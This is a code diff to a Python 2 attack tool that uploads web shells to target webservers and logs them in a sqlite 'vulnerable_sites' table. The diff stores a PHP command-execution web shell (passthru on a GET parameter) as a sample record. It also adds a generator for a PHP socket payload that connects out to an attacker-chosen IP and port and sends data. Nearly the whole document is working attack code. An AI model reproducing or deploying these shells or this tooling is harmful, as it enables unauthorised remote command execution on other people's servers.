@@ -23,7 +23,6 @@ def upload_shell():
 	page = raw_input("page:")
 	method = raw_input("http method:")
 
-
 def help():
 	print "Interactive help menu type  help <module> to get more information on a module\n"
 	print "upload-shell\t\t Upload a shell to target webserver"
@@ -50,23 +49,33 @@ def initialize_database():
 	global database_name
 	database_name = name
 	cursor = conn.cursor()
-	cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text, attackurl text)")
+	cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text, attackurl text, language text)")
 	cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
 		[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
 	conn.commit()
 
 def show_shells():
 	"""
-		Shows the currently running shells at specified urls
+		Shows the currently uploaded shells at specified urls
 	"""
 	conn = sqlite3.connect(database_name)
 	cursor = conn.cursor()
-	query = "select * from vulnerable_sites"
+	query = "select attackurl from vulnerable_sites"
 	cursor.execute(query)
-	print cursor.fetchall()
+	rows = cursor.fetchall()
+	print "number\t\tattackurl"
+	print "------\t\t---------"
+	i=0
+	for row in rows:
+		print str(i)+'\t\t',row[0]
+		i+=1
 
 def generate_scan_shell():
-	pass
+	name = raw_input("save as:")
+	shell = "<?php $s=socket_create(AF_INET,SOCK_STREAM,0);\
+		socket_connect($s,$_GET['ip'],$_GET['port']);\
+		$m=$_GET['m'];socket_send($s,$m,strlen($m),0)?>"
+	
 
 def exit():
 	sys.exit(1)
